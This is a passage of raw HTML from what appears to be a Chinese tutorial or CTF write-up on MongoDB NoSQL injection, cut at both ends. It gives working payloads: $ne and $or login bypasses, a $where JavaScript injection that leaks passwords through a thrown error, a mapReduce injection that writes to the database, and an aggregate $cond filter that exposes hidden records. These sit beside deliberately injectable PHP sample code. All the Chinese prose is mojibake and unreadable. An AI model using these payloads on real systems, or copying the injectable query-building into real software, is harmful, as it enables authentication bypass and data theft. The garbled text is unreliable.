class="hljs-string">&#x27;&#125;]</span><br></code></pre></div></td></tr></table></figure><p>è¿™æ ·æœ€ç»ˆçš„æŸ¥è¯¢è¯­å¥å°±å˜ä¸º</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&#123; username: <span class="hljs-string">&#x27;admin&#x27;</span>,&#123;<span class="hljs-variable">$or</span>:[&#123;&#125;,&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>, password: <span class="hljs-string">&#x27;&#x27;</span>&#125;] &#125;<br>åœ¨åç«¯ä¸­å³ä¸ºï¼š&#123; username: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$or</span>: [ &#123;&#125;, &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>, password:<span class="hljs-string">&#x27;&#x27;</span>&#125;]&#125;<br></code></pre></div></td></tr></table></figure><h3 id="JavaScript-æ³¨å…¥"><a href="#JavaScript-æ³¨å…¥" class="headerlink" title="JavaScript æ³¨å…¥"></a><strong>JavaScript æ³¨å…¥</strong></h3><p>æˆ‘ä»¬çŸ¥é“ MongDB Server æ˜¯æ”¯æŒ JavaScript è¯­è¨€çš„ï¼Œè¿™æ ·ç»™å¼€å‘äººå‘˜å¸¦æ¥äº†å¾ˆå¤šéå¸¸æ–¹ä¾¿çš„ä½¿ç”¨æ–¹æ³•ï¼Œä½†ä¹Ÿæ˜¯å› ä¸ºå®ƒæœ¬èº«çš„çµæ´»æ€§ï¼Œé€ æˆäº† JavaScript æ³¨å…¥ã€‚è¿™é‡Œæœ‰ä¸ªä¾‹å­æ˜¯ä¸€ä¸ªç¥¥äº‘æ¯çš„ä¸€ä¸ªé¢˜ï¼Œé‚£ä¸ªæ˜¯ç”¨node.jså®ç°çš„ä¸€ä¸ªmongodbæŸ¥è¯¢ï¼Œå½“æ—¶æ˜¯å¯ä»¥ä½¿ç”¨nodejsæŠ¥é”™æœºåˆ¶æ¥å°†å¯†ç å¸¦å‡ºæ¥ã€‚</p><p>æŸ¥è¯¢è¯­å¥å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">let</span> docs = <span class="hljs-keyword">await</span> User.$where(<span class="hljs-string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="hljs-subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹payloadè¿›è¡ŒæŠ¥é”™ã€‚</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span class="hljs-string">&quot;||(()=&gt;&#123;throw Error(this.password)&#125;)()==&quot;</span>admin<br></code></pre></div></td></tr></table></figure><h5 id="where-æ“ä½œç¬¦"><a href="#where-æ“ä½œç¬¦" class="headerlink" title="$where æ“ä½œç¬¦"></a><strong>$where æ“ä½œç¬¦</strong></h5><p>åœ¨ MongoDB ä¸­ $where æ“ä½œç¬¦æ˜¯å¯ä»¥æ‰§è¡Œ JavaScript è¯­å¥çš„ï¼Œåœ¨ MongoDB 2.4 ä¹‹å‰ï¼Œé€šè¿‡ $where æ“ä½œç¬¦ä½¿ç”¨<code>map-reduce</code>ã€<code>group</code>å‘½ä»¤å¯ä»¥è®¿é—®åˆ° mongo shell ä¸­çš„å…¨å±€å‡½æ•°å’Œå±æ€§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$function</span> = <span class="hljs-string">&quot;function() &#123;if(this.uname == &#x27;<span class="hljs-subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="hljs-subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;$where&#x27;</span> =&gt; <span class="hljs-variable">$function</span><br>));<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br></code></pre></div></td></tr></table></figure><p>MongoDB&lt;2.4ä¹‹å‰å¯ä»¥è®¿é—®åˆ°å…¨å±€å±æ€§</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">?username=<span class="hljs-string">&#x27;||1) return &#123;&#x27;</span>username<span class="hljs-string">&#x27;: tojson(db.getCollectionNames()), &#x27;</span>password<span class="hljs-string">&#x27;: &#x27;</span>hacked<span class="hljs-string">&#x27;&#125;&#125;//&amp;password=1</span><br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå­˜åœ¨nosqlçš„ä¸‡èƒ½å¯†ç </p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?username=<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-number">1</span>&amp;pwd=<span class="hljs-number">1</span><br>?username=<span class="hljs-number">1</span>&amp;pwd=admin<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br></code></pre></div></td></tr></table></figure><h4 id="mapReduce"><a href="#mapReduce" class="headerlink" title="mapReduce"></a><strong>mapReduce</strong></h4><p>çœ‹ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ç»™çš„ä¾‹å­</p><p><img src="https://img-blog.csdnimg.cn/24aea38e18414b5dbc2452ae94c9fd76.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>Map å‡½æ•°å’Œ Reduce å‡½æ•°å¯ä»¥ä½¿ç”¨ JavaScript æ¥å®ç°ï¼Œä½¿å¾— MapReduce çš„ä½¿ç”¨éå¸¸çµæ´»å’Œå¼ºå¤§ã€‚ä½†æ˜¯åŒæ ·ä¹Ÿå¸¦æ¥äº†éšæ‚£ï¼Œå‡è®¾æœ‰è¿™æ ·çš„ä¸€ä¸ªä¸šåŠ¡åœºæ™¯ï¼Œæ•°æ®åº“ä¸­å­˜å‚¨äº†ä¸€ä¸ª<code>store</code>é›†åˆï¼Œæœ‰ä¸€ç³»åˆ—å•†å“çš„åç§°ã€ä»·æ ¼å’Œæ•°é‡ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°ç›¸åŒå•†å“çš„ä»·æ ¼æˆ–è€…æ•°é‡çš„æ€»å’Œï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">require_once __DIR__ . <span class="hljs-string">&quot;/vendor/autoload.php&quot;</span>;<br>$param = $_POST[<span class="hljs-string">&#x27;param&#x27;</span>];<br>$collection = (<span class="hljs-keyword">new</span> MongoDB\Client)-&gt;test-&gt;stores;<br>$map = <span class="hljs-string">&quot;function() &#123;</span><br><span class="hljs-string">        for (var i = 0; i &lt; this.items.length; i++) &#123;</span><br><span class="hljs-string">      emit(this.name, this.items[i].$param);    &#125;</span><br><span class="hljs-string">        &#125;&quot;</span>;<br>$reduce = <span class="hljs-string">&quot;function(name, sum) &#123; return Array.sum(sum); &#125;&quot;</span>;<br>$opt = <span class="hljs-string">&quot;&#123; out: &#x27;totals&#x27; &#125;&quot;</span>;<br>$results = $collection-&gt;mapReduce($map, $reduce, $out);<br><br>è¿™é‡Œmapä¸­emitç¬¬ä¸€ä¸ªå‚æ•°ä¸ºéœ€è¦åˆ†ç»„çš„å­—æ®µåï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºéœ€è¦è¿›è¡Œç»Ÿè®¡çš„å­—æ®µå<br>reduceå‡½æ•°å‚æ•°<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reduce</span>(<span class="hljs-params">key, values</span>)</span>&#123; <span class="hljs-comment">// ç»Ÿè®¡å­—æ®µå¤„ç† &#125;</span><br>keyï¼š æŒ‡åˆ†ç»„å­—æ®µï¼ˆemitçš„param1ï¼‰å¯¹åº”çš„å€¼ï¼›<br>valuesï¼šæŒ‡éœ€è¦ç»Ÿè®¡çš„å­—æ®µï¼ˆemitçš„param2ï¼‰å€¼ç»„æˆçš„æ•°ç»„ã€‚<br></code></pre></div></td></tr></table></figure><p>è¯¥ä»£ç åº”è¯¥åœ¨<code>$param</code>ç»™å®šçš„å­—æ®µä¸Šæ±‚å’Œï¼Œä½†æ˜¯è¿™åŒæ ·ç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºï¼Œå¦‚æœ<code>$param</code>æ˜¯è¿™æ ·ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">a);&#125;&#125;,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">kv</span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;, &#123; <span class="hljs-attr">out</span>: â€˜xâ€™ &#125;);<br>db.injection.insert(&#123;<span class="hljs-attr">success</span>:<span class="hljs-number">1</span>&#125;); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; &#123; emit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>é‚£ä¹ˆåœ¨ MongoDB ä¸­å°±ç›¸å½“äºæ‰§è¡Œäº†ä¸‹é¢è¿™æ¡è¯­å¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.items.length; i++) &#123;<br>emit(<span class="hljs-built_in">this</span>.name, <span class="hljs-built_in">this</span>.items[i].a);<br>&#125;<br>&#125;,<br><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">kv</span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;, &#123; <span class="hljs-attr">out</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;);<br>db.injection.insert(&#123;<span class="hljs-attr">success</span>:<span class="hljs-number">1</span>&#125;); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; &#123; emit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>); &#125; &#125;,<br><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">name, sum</span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.sum(sum); &#125;, &#123; <span class="hljs-attr">out</span>: <span class="hljs-string">&#x27;totals&#x27;</span> &#125;);<span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>å’Œsqlç›²æ³¨åŒºåˆ«ä¸å¤§</p><h1 id="æ“ä½œå®ä¾‹"><a href="#æ“ä½œå®ä¾‹" class="headerlink" title="æ“ä½œå®ä¾‹"></a>æ“ä½œå®ä¾‹</h1><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&quot;/vendor/autoload.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auth</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>    <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;users;<br>    <span class="hljs-variable">$raw_query</span> = <span class="hljs-string">&#x27;&#123;&quot;username&quot;: &quot;&#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;&quot;, &quot;password&quot;: &quot;&#x27;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$document</span> = <span class="hljs-variable">$collection</span>-&gt;findOne(json_decode(<span class="hljs-variable">$raw_query</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$document</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$document</span>-&gt;password)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user</span> = auth(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user</span> = auth(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>) &#123;<br>        setcookie(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>        setcookie(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span> == <span class="hljs-literal">true</span>): <span class="hljs-meta">?&gt;</span><br>    Welcome!<br>    &lt;div&gt;<br>        Group most common news by<br>        &lt;a href=<span class="hljs-string">&quot;?filter=<span class="hljs-subst">$category</span>&quot;</span>&gt;category&lt;/a&gt; |<br>        &lt;a href=<span class="hljs-string">&quot;?filter=<span class="hljs-subst">$public</span>&quot;</span>&gt;publicity&lt;/a&gt;&lt;br&gt;<br>    &lt;/div&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$filter</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filter&#x27;</span>];<br>        <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;news;<br>        <span class="hljs-variable">$pipeline</span> = [<br>            [<span class="hljs-string">&#x27;$group&#x27;</span> =&gt; [<span class="hljs-string">&#x27;_id&#x27;</span> =&gt; <span class="hljs-string">&#x27;$category&#x27;</span>, <span class="hljs-string">&#x27;count&#x27;</span> =&gt; [<span class="hljs-string">&#x27;$sum&#x27;</span> =&gt; <span class="hljs-number">1</span>]]],<br>            [<span class="hljs-string">&#x27;$sort&#x27;</span> =&gt; [<span class="hljs-string">&#x27;count&#x27;</span> =&gt; -<span class="hljs-number">1</span>]],<br>            [<span class="hljs-string">&#x27;$limit&#x27;</span> =&gt; <span class="hljs-number">5</span>],<br>        ];<br>        <span class="hljs-variable">$filters</span> = [<br>            [<span class="hljs-string">&#x27;$project&#x27;</span> =&gt; [<span class="hljs-string">&#x27;category&#x27;</span> =&gt; <span class="hljs-variable">$filter</span>]]<br>        ];<br>        <span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;aggregate(array_merge(<span class="hljs-variable">$filters</span>, <span class="hljs-variable">$pipeline</span>));<br>    <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filter</span>)): <span class="hljs-meta">?&gt;</span><br>        <span class="hljs-meta">&lt;?php</span><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$category</span>) &#123;<br>                    printf(<span class="hljs-string">&quot;%s has %d news&lt;br&gt;&quot;</span>, <span class="hljs-variable">$category</span>[<span class="hljs-string">&#x27;_id&#x27;</span>], <span class="hljs-variable">$category</span>[<span class="hljs-string">&#x27;count&#x27;</span>]);<br>            &#125;<br>        <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">else</span>: <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])): <span class="hljs-meta">?&gt;</span><br>        Invalid username <span class="hljs-keyword">or</span> password<br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br>    &lt;form action=<span class="hljs-string">&#x27;/&#x27;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>    &lt;/form&gt;<br>    &lt;h2&gt;News&lt;/h2&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;news;<br>        <span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;find([<span class="hljs-string">&#x27;public&#x27;</span> =&gt; <span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$news</span>) &#123;<br>            printf(<span class="hljs-string">&quot;%s&lt;br&gt;&quot;</span>, <span class="hljs-variable">$news</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œç¬¬ä¸€æ­¥æ°¸çœŸç»•è¿‡,payloadä¸ºã€‚æ–‡ç« ä¸­ç”¨å¾—<code>&quot;$ne&quot;=null</code>ä½†æˆ‘æœ¬åœ°ä¸å¯¹å¯èƒ½æ˜¯phpç‰ˆæœ¬å¾—é—®é¢˜</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/mongo/test_mongo.php?username=1&amp;password=&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;, &quot;username&quot;:&quot;admin</span><br></code></pre></div></td></tr></table></figure><p>è¾“å‡ºä¸º</p><p><img src="https://img-blog.csdnimg.cn/372db5c3313c40c8a192b4228294f7e3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¬¬äºŒæ­¥æ¼æ´åœ¨<code>aggregate</code>æ–¹æ³•</p><p>filter å‚æ•°é‡Œå¯ä»¥å¡« <code>category</code>å±•ç¤ºç›®å½• <code>text</code>å±•ç¤ºå†…å®¹ <code>title</code>å±•ç¤ºæ ‡é¢˜ï¼Œä½†æ˜¯éƒ½é™åˆ¶äº†5æ¡ã€‚</p><p>ä»£ç é‡Œæ˜¯ç”¨çš„ MongoDB èšåˆå‡½æ•°<code>aggregate</code>ï¼Œä¸‹é¢è¿™å¼ å›¾ä¹Ÿæ˜¯æ¥è‡ªå®˜æ–¹æ–‡æ¡£ï¼Œè§£é‡Šäº†<code>aggregate</code>å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ï¼š</p><p><img src="https://img-blog.csdnimg.cn/0683249c7df14e87ae36aacadd54991d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½¿ç”¨<code>aggregate</code>èšåˆå‡½æ•°æ—¶ï¼Œåœ¨é‡Œé¢æ˜¯å¯ä»¥ä½¿ç”¨æ¡ä»¶åˆ¤æ–­è¯­å¥çš„ã€‚åœ¨ MongoDB ä¸­<code>$cond</code>è¡¨ç¤ºifåˆ¤æ–­è¯­å¥ï¼ŒåŒ¹é…çš„ç¬¦å·ä½¿ç”¨<code>$eq</code>ï¼Œè¿èµ·æ¥ä¸º<code>[$cond][if][$eq]</code>ï¼Œå½“ä½¿ç”¨å¤šä¸ªåˆ¤æ–­æ¡ä»¶æ—¶é‡å¤è¯¥è¯­å¥å³å¯ã€‚</p><p>å®˜æ–¹æ–‡æ¡£åˆ—å‡ºçš„<code>$cond</code>çš„ç”¨æ³•ï¼š $projectå¯ä»¥æŒ‡å®šè¾“å‡ºéœ€è¦æŸ¥è¯¢å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">db.inventory.aggregate(<br>   [<br>      &#123;<br>         $project:<br>           &#123;<br>             item: 1,<br>             discount:<br>               &#123;<br>                 $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125;<br>               &#125;<br>           &#125;<br>      &#125;<br>   ]<br>)<br></code></pre></div></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬çš„ç›®çš„æ˜¯ï¼šå¦‚æœ<code>$category</code>çš„å€¼æ˜¯ flagï¼Œé‚£ä¹ˆå°±è¾“å‡º<code>$title</code>çš„å†…å®¹ï¼Œå¦åˆ™è¿˜æ˜¯åŸæ ·è¾“å‡º<code>$catagory</code>ï¼Œç…§ç€ä¸Šé¢çš„ä¾‹å­å†™æˆ MongoDB shell çš„å½¢å¼å°±æ˜¯</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">db.news.aggregate(<br>   [<br>      &#123;<br>         $project:<br>           &#123;<br>             category:<br>               &#123;<br>                 $cond: &#123; <span class="hljs-attr">if</span>: &#123; <span class="hljs-attr">$eq</span>: [ <span class="hljs-string">&quot;$category&quot;</span>, <span class="hljs-string">&quot;flags&quot;</span> ] &#125;, <span class="hljs-attr">then</span>: $title, <span class="hljs-attr">else</span>: $category &#125;<br>               &#125;<br>           &#125;<br>      &#125;<br>   ]<br>)<br></code></pre></div></td></tr></table></figure><p>è½¬æ¢æˆ PHP æ•°ç»„å½¢å¼ä¼ å…¥ filter å‚æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">?filter[$cond][<span class="hljs-keyword">if</span>][$eq][]=flags&amp;filter[$cond][<span class="hljs-keyword">if</span>][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][<span class="hljs-keyword">else</span>]=$category<br></code></pre></div></td></tr></table></figure><p>è½¬æ¢æˆ<code>raw_query</code>çš„å½¢å¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;category&quot;</span>:<br>    &#123;<br>     <span 